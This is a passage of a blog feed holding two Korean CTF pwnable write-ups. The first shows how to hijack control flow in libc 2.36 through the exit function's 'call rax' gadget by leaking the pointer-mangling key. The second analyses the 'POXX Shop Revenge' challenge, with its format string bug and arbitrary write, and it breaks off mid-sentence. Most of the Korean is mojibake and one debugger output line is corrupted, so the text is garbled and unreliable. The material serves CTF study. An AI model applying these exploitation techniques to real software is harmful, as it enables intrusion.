        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>ÏúÑ Î¨∏Ï†úÎ•º libc 2.36Ïùò <code>exit</code> Ìï®ÏàòÏùò <code>call rax</code> Í∞ÄÏ†ØÏùÑ Ïù¥Ïö©ÌïòÏó¨ ÏùµÏä§ÌîåÎ°úÏûáÌïòÎäî Í≥ºÏ†ïÏù¥Îã§.</p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>ÎïåÎäî Î∞îÏïºÌùêÎ°ú ÏïΩ Ìïú Îã¨ Ï†Ñ.. POXX 2022 Î≥∏ÏÑ† Î¨∏Ï†ú Ï∂úÏ†úÎ•º ÌïòÎçò Ï§ëÏù¥ÏóàÎã§. Ìï¥Îãπ Î¨∏Ï†úÎäî fsbÏôÄ aawÍ∞Ä Í∞ÄÎä•ÌïòÏßÄÎßå FULL RELROÍ∞Ä Í±∏Î†§ÏûàÏñ¥ GOT overwritingÏùÄ Î∂àÍ∞ÄÎä• Ìï¥ÏÑú ÏùºÎ∞òÏ†ÅÏúºÎ°ú <code>malloc_hook</code>Ïù¥ÎÇò <code>free_hook</code>ÏùÑ ÎçÆÏñ¥ÏÑú ÏùµÏä§Ìï¥Ïïº ÌïúÎã§. ÌïòÏßÄÎßå Ìï¥Îãπ Î¨∏Ï†úÏóêÏÑúÏùò libc Î≤ÑÏ†ÑÏù¥ ÏµúÏã† Î≤ÑÏ†Ñ(2.36) Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê ÏúÑÏôÄ Í∞ôÏùÄ Î∞©Î≤ïÏùÄ ÏùµÏä§Í∞Ä Î∂àÍ∞ÄÎä•ÌïòÎã§. ÏôúÎÉêÌïòÎ©¥ Îëò Îã§ ÏÇ¨Ïö©ÏùÑ ÏïàÌïòÎäî Í≤ÉÏúºÎ°ú Ìå®ÏπòÎêòÏóàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. Ìï¥Îãπ Í≥ºÏ†ïÏùÑ Î∂ÑÏÑùÌïòÍ≤å Îêú Í≥ÑÍ∏∞Îäî, printfÏóêÏÑúÏùò malloc Ìò∏Ï∂úÍ≥º exitÏóêÏÑúÏùò free Ìò∏Ï∂úÏùÑ ÏÇ¥Ìé¥Î≥¥Î©¥ÏÑú Î∂ÑÏÑùÌïòÍ≤å ÎêòÏóàÎã§. </p><p><code>malloc_hook</code>Í≥º <code>free_hook</code>ÏùÑ ÏÇ¨Ïö©ÌïòÏßÄ ÏïäÎäî ÏùµÏä§ Î∞©Î≤ïÏù¥ ÏûàÏùÑÍπå Î∂ÑÏÑùÏùÑ ÏßÑÌñâÌïòÎã§Í∞Ä <code>exit</code> Ìï®ÏàòÏóêÏÑú <code>call rax</code> ÎùºÎäî Ïì∏ÎßåÌïú Í∞ÄÏ†ØÏùÑ Î≥¥ÏïòÍ≥† Ìï¥Îãπ Î∂ÄÎ∂Ñ Ìä∏Î¶¨Í±∞Î•º ÏßÑÌñâÌï¥Î≥¥ÏïòÎã§. Î¨ºÎ°† Ïó¨Îü¨Í∞ÄÏßÄÏùò ÏãúÌñâÏ∞©Ïò§Í∞Ä ÏûàÏóàÏßÄÎßå Ìïú Îã¨ Ï†ÑÏùò ÏùºÏù¥Îùº Í∏∞ÏñµÏù¥ Í∞ÄÎ¨ºÌïòÍ∏∞ÎèÑ Ìï¥ÏÑú Ìä∏Î¶¨Í±∞Ïóê ÏÑ±Í≥µÌïú Í≥ºÏ†ïÎßå Í∞ÑÎûµÌïòÍ≤å Î∏îÎ°úÍ∑∏Ïóê ÏûëÏÑ±Ìï¥Î≥¥Í≤†Îã§.</p><h2 id="How-to-RIP-control-in-libc-2-36"><a href="#How-to-RIP-control-in-libc-2-36" class="headerlink" title="How to RIP control in libc 2.36"></a>How to RIP control in libc 2.36</h2><p><img src="/images/221122-how_to_rip_control_in_libc236/221122-1.png" alt="img1">  </p><p>Ï£ºÎ™©Ìï† Í∞ÄÏ†ØÏùÄ <code>loc_3AF9E</code>Ïùò <code>call rax</code>Ïù¥Í≥† <code>rax</code>Ïóê ÏßëÏ§ë Î∞è ÎèôÏ†Å Î∂ÑÏÑùÏùÑ ÌÜµÌï¥ ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú Î∂ÑÏÑùÌï† Î∏îÎ°ùÏùÄ <code>loc_3AF70</code>Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000003AF70</span><br><span class="line">.text:000000000003AF70 loc_3AF70:</span><br><span class="line">.text:000000000003AF70 add     rdx, r15</span><br><span class="line">.text:000000000003AF73 mov     rax, [rdx+18h]</span><br><span class="line">.text:000000000003AF77 mov     r13, [rdx+20h]</span><br><span class="line">.text:000000000003AF7B mov     qword ptr [rdx+10h], 0</span><br><span class="line">.text:000000000003AF83 mov     edx, ebx</span><br><span class="line">.text:000000000003AF85 ror     rax, 11h</span><br><span class="line">.text:000000000003AF89 xor     rax, fs:30h</span><br><span class="line">.text:000000000003AF92 xchg    edx, [r14]</span><br><span class="line">.text:000000000003AF95 cmp     edx, 1</span><br><span class="line">.text:000000000003AF98 jg      loc_3B0B0</span><br></pre></td></tr></table></figure><p>$rax Í∞íÏùÑ [rdx+18h]ÏóêÏÑú Í∞ÄÏ†∏ÏôÄÏÑú, ROR Ïó∞ÏÇ∞ÏùÑ ÏãúÎèÑÌïúÎã§. Í∑∏ ÌõÑ XOR Ïó∞ÏÇ∞ÎèÑ ÏßÑÌñâÌïúÎã§. Ïù¥Îü¨Ìïú Îëê Î≤àÏùò Ïó∞ÏÇ∞ÏùÑ Í±∞Ï≥êÏÑú Í≤∞Íµ≠ <code>call rax</code>Î•º ÌïúÎã§. Ïö∞Î¶¨Îäî ÏûÑÏùò Ï£ºÏÜå Ïì∞Í∏∞Í∞Ä Í∞ÄÎä•ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê raxÎ•º Ï°∞ÏûëÌï† Ïàò ÏûàÎäî ÏÉÅÌô©Ïù¥Îã§. Îçî ÎÇòÏïÑÍ∞ÄÏÑú ÏÉùÍ∞ÅÌï¥Î≥¥Î©¥ [rdx+18h]ÏùÑ ÏßÅÏ†ë Ï°∞ÏûëÌï† Ïàò ÏûàÍ≥†, Ìï¥Îãπ Í∞íÏùÄ Ïö∞Î¶¨Í∞Ä Ìò∏Ï∂úÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜåÍ∞Ä signing Îêú Í∞íÏûÑÏùÑ Ïïå Ïàò ÏûàÎã§.</p><p>Ïó≠Ïó∞ÏÇ∞ÏùÑ ÌÜµÌï¥ signing Îêú Í∞íÏù¥ Î¨¥ÏóáÏù∏ÏßÄ ÏàòÏãùÏúºÎ°ú ÏûëÏÑ±Ìï¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">sign = ROL(e.sym[<span class="string">&#x27;gift&#x27;</span>] ^ key, <span class="number">0x11</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>signing Îêú Í∞íÏùÑ Íµ¨ÌïòÍ∏∞ ÏúÑÌï¥ keyÎ•º ÏïåÏïÑÏïº ÌïúÎã§. 0x3AF89Ïóê break pointÎ•º Í±∏Í≥† rax Î†àÏßÄÏä§ÌÑ∞Î•º 0ÏúºÎ°ú ÏÑ∏ÌåÖÌïòÎ©¥ ÏïÑÎûòÏùò ÏãùÏóê ÏùòÌï¥ <code>fs:30h</code> Í∞íÏùÑ Íµ¨Ìï† Ïàò ÏûàÎã§. Ïù¥ Í∞íÏù¥ keyÏù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 ^ A = A</span><br></pre></td></tr></table></figure><p>Í∑∏Î†áÍ≤å Íµ¨Ìïú <code>fs:30h</code>ÏùÑ Î©îÎ™®Î¶¨ ÏÉÅÏóêÏÑú Í≤ÄÏÉâÌï¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef‚û§  search-pattern 0x7801dafd8bba0173</span><br><span class="line">[+] Searching &#x27;\x73\x01\xba\x8b\xfd\xda\x01\x78&#x27; in memory</span><br><span class="line">[+] In (0x7fedbeb04000-0x7fedbeb07000), permission=rw-</span><br><span class="line">  0x7fedbeb04770 - 0x7fedbeb04790  ‚Üí   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;/usr/lib/ld-linux-x86-64.so.2&#x27;(0x7fedbed37000-0x7fedbed39000), permission=r--</span><br><span class="line">  0x7fedbed38a70 - 0x7fedbed38a90  ‚Üí   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;[stack]&#x27;(0x7fff23bf6000-0x7fff23c17000), permissdfsd</span><br><span class="line"></span><br><span class="line">\xfd\xda\x01\x78[...]&quot;</span><br></pre></td></tr></table></figure><p>stackÏóê Ïù¥ÎØ∏ Ìï¥Îãπ Í∞íÏù¥ Ï°¥Ïû¨ÌïòÍ≥† ÏûàÏóàÍ≥†, Ìï¥Îãπ Î¨∏Ï†úÏóêÏÑú fsb ÌÑ∞ÏßÄÎäî Ï£ºÏÜåÍ∞Ä Îçî ÎÜíÏùÄ Í≥≥Ïóê ÏúÑÏπòÌñàÍ∏∞ ÎïåÎ¨∏Ïóê <code>fs:30h</code>ÏùÑ leakÌï† Ïàò ÏûàÎã§.</p><p>Îã§Îßå key Í∞íÏù¥ Ìïú Î∞îÏù¥Ìä∏ Î∞ÄÎ†§ ÏûàÏñ¥ÏÑú(?) Ï°∞Í∏àÏùò Ï†ÑÏ≤òÎ¶¨ Í≥ºÏ†ïÏù¥ ÌïÑÏöîÌïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff23c14cf0: 0x01dafd8bba0173f5      0x0034365f36387878</span><br></pre></td></tr></table></figure><p>leak1 &#x3D; 0x01dafd8bba0173f5<br>leak2 &#x3D; 0x0034365f36387878</p><p>leak1ÏóêÏÑú Îß® ÎßàÏßÄÎßâ Î∞îÏù¥Ìä∏Î•º ÏûêÎ•¥Í≥† leak2ÏóêÏÑú Îß® ÎßàÏßÄÎßâ Î∞îÏù¥Ìä∏Î•º Í∞ÄÏ†∏ÏôÄ Îß® ÏïûÏóê Î∂ôÏó¨Ï§òÏïº ÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak1 &gt;&gt; 8 = 0x1dafd8bba0173</span><br><span class="line">leak2 &amp; 0xff = 0x78</span><br></pre></td></tr></table></figure><p>ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú ÏïÑÎûòÏôÄ Í∞ôÏùÄ ÏàòÏãùÏùÑ ÌÜµÌï¥ key Í∞íÏùÑ Íµ¨Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = (leak1 &gt;&gt; 8) + ((leak2 &amp; 0xff) &lt;&lt; 8*7)</span><br><span class="line">key = 0x7801dafd8bba0173</span><br></pre></td></tr></table></figure><p>Í≤∞Î°†Ï†ÅÏúºÎ°ú Ïö∞Î¶¨Îäî keyÎ•º Íµ¨ÌñàÏúºÎØÄÎ°ú gift Ìï®ÏàòÍ∞Ä signing Îêú Í∞íÏùÑ Íµ¨ÌïòÍ≥† Ïä§ÌÉùÏóê Í∞íÏùÑ Ïì∏ Ïàò ÏûàÎã§. Ïù¥ Í∞íÏùÄ exit Ìï®ÏàòÏùò Î°úÏßÅ Ï§ë Ïù∏Ï¶ùÏù¥ ÎêòÏñ¥ ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú call Ìï† Ïàò ÏûàÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(auther) Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
      <link href="/221121-poxx2022-shop_revenge/"/>
      <url>/221121-poxx2022-shop_revenge/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(0&#x2F;10) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Ï†ÄÎ≤àÏóêÎäî Ïù¥Í±∞ shellÎ°ú Î∞îÍøîÏ£ºÏÖ®ÏûñÏïÑÏöî..</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ Dockerfile</span><br><span class="line">‚îî‚îÄ‚îÄ chall</span><br></pre></td></tr></table></figure><p>DockerfileÏóêÏÑú libcÎ•º Ï∂îÏ∂úÌï¥ÏÑú patchÌïú Îã§ÏùåÏóê Î¨∏Ï†úÎ•º ÌíÄÏñ¥Ïïº ÌïúÎã§. Ï∞∏Í≥†Î°ú ÏµúÏã† libcÏù¥Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>No canary foundÎùºÍ≥† ÎÇòÏò§ÏßÄÎßå canaryÍ∞Ä Ï°¥Ïû¨ÌïúÎã§.</p><p>FULL RELROÎùºÏÑú GOT overwritingÏù¥ Î∂àÍ∞ÄÎä•ÌïòÎã§. Í∑∏ÎûòÏÑú Î≥¥ÌÜµ <code>malloc_hook</code>, <code>free_hook</code>, <code>_rtld_global._dl_rtld_lock_recursive</code> Îì±ÏùÑ ÎçÆÏñ¥ Ïã§Ìñâ ÌùêÎ¶ÑÏùÑ Ï°∞ÏûëÌï† Ïàò ÏûàÎã§. ÌïòÏßÄÎßå Î¨∏Ï†úÏóêÏÑú ÏµúÏã† libcÎ•º ÏÇ¨Ïö©ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>malloc_hook</code>Í≥º <code>free_hook</code> Îì±ÏùÑ ÎçÆÎäî Í≤ÉÏùÄ Î∂àÍ∞ÄÎä•ÌïòÍ≥† ÎçÆÏùÑ Îã§Î•∏ Í≥≥ÏùÑ Ï∞æÏïÑÎ¥êÏïº ÌïúÎã§.</p><h3 id="Souece-Code"><a href="#Souece-Code" class="headerlink" title="Souece Code"></a>Souece Code</h3><p>ida Ï†ÑÏ≤¥ ÏΩîÎìúÏù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  _BYTE nptr[<span class="number">23</span>]; <span class="comment">// [rsp+29h] [rbp-17h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">15</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">176LL</span>);</span><br><span class="line">  buf = &amp;v4;</span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  initialize(argc, argv, <span class="number">8LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*** POXX Shop! ***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Buy&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Exchange&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Return&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What do you want for return?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, It&#x27;s impossible.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">110</span>) )</span><br><span class="line">          <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">        v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">        v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        *v7 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏïÑÎûò 1Î≤à Î©îÎâ¥ÏôÄ 2Î≤à Î©îÎâ¥ÏóêÏÑú Í∞ÅÍ∞Å Ï∑®ÏïΩÏ†êÏù¥ Ï°¥Ïû¨ÌïòÎ©∞, Ìï¥Îãπ Ï∑®ÏïΩÏ†êÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÏùµÏä§ÌîåÎ°úÏûá ÏΩîÎìú ÏûëÏÑ±Ïù¥ Í∞ÄÎä•ÌïòÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&#x27;n&#x27;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);            <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">  v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">  v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  *v7 = v8;                               <span class="comment">// aaw</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Î®ºÏ†Ä 1Î≤à Î©îÎâ¥Î•º ÏÇ¥Ìé¥Î≥¥Ïûê. bufÏóê ÏûÖÎ†•ÏùÑ Î∞õÍ≥† <code>printf</code>Î°ú Ï∂úÎ†•ÏùÑ Ìï¥Ï§ÄÎã§. Ïù¥ Îïå fsbÍ∞Ä Î∞úÏÉùÌïòÏßÄÎßå ‚Äòn‚ÄôÏùÑ ÌïÑÌÑ∞ÎßÅÌïòÍ≥† ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ïä§ÌÉù Ï£ºÏÜå leakÎßå Í∞ÄÎä•ÌïòÎã§.</p><p>2Î≤à Î©îÎâ¥ÏóêÏÑúÎäî <code>*v7 = v8;</code> Ïù¥ Íµ¨Î¨∏ÏùÑ ÌÜµÌï¥ ÏõêÌïòÎäî Ï£ºÏÜåÏóê ÏõêÌïòÎäî Í∞íÏùÑ Ïì∏ Ïàò ÏûàÎã§. Îã§Ïãú ÎßêÌï¥ÏÑú ÏûÑÏùò Ï£ºÏÜå Ïì∞Í∏∞Í∞Ä Í∞ÄÎä•ÌïòÎã§.</p><p>Ïù¥Îïå <code>strtoul</code>ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Ï†ïÏàòÎ°ú Íµ¨ÏÑ±Îêú strÏùÑ unsigned longÏúºÎ°ú Î∞îÍøîÏ§ÄÎã§. </p><p>v7Ïóê 0x7ffcea69ddf0Î•º ÎÑ£Í≥† Ïã∂Îã§Î©¥? <code>read</code>ÏóêÏÑú nptrÏóê Ìï¥Îãπ Í∞íÏùÑ ÏûÖÎ†•Ìï¥ÏïºÌïúÎã§. Í∑∏Îüº <code>strtoul</code> Ìï®ÏàòÏùò Ïù∏ÏûêÎäî ÏïÑÎûòÏôÄ Í∞ôÏù¥ Îì§Ïñ¥Í∞ÄÍ≤å ÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtoul@plt (</span><br><span class="line">   $rdi = 0x007ffcea69de19 ‚Üí &quot;140724241292784&quot;,</span><br><span class="line">   $rsi = 0x00000000000000,</span><br><span class="line">   $rdx = 0x0000000000000a</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Í∑∏Î¶¨Í≥† Î∞òÌôòÍ∞íÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x007ffcea69ddf0</span><br></pre></td></tr></table></figure><p>Ï∂úÏ†úÏûêÏùò ÏûÖÏû•ÏóêÏÑú v7ÏùÑ ÏúÑÌïú nptrÏùÑ ÏûÖÎ†•Î∞õÏùÑ Îïå Ïôú sizeÍ∞Ä 0xFÏù∏ Ïù¥Ïú†Î•º ÏÑ§Î™ÖÌï¥Î≥¥Í≤†Îã§. </p><p>Î≥¥ÌÜµ Ïù∏ÌÖî 64bitÏóêÏÑú Î¶ΩÏãúÎÇò Ïä§ÌÉù Ï£ºÏÜåÎäî 0x7fÎ°ú ÏãúÏûëÌïòÍ≤å ÎêòÍ≥†, Î™ªÌï¥ÎèÑ ÏõêÌïòÎäî ÏûÖÎ†•ÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜåÏùò Î≤îÏúÑÎäî ÏïÑÎûòÏôÄ Í∞ôÏùÑ Í≤ÉÏù¥ÎùºÍ≥† ÏÉùÍ∞ÅÌñàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0000000000 ~ 0x7fffffffffff</span><br><span class="line">139637976727552 ~ 140737488355327</span><br></pre></td></tr></table></figure><p>Ïù¥ Í∞íÏùÄ <code>strtoul</code> Ìï®ÏàòÏóê ÏùòÌï¥ Î¨∏ÏûêÏó¥(ÏòàÎ•º Îì§Î©¥ 140737488355327)Ïù¥ unsigned longÏúºÎ°ú Î∞îÎÄåÍ≤å ÎêòÎØÄÎ°ú, ÏûÖÎ†•ÌïòÎäî Í∏ÄÏûê ÏàòÎ•º <code>len(&#39;140737488355327&#39;)=15</code>Î°ú 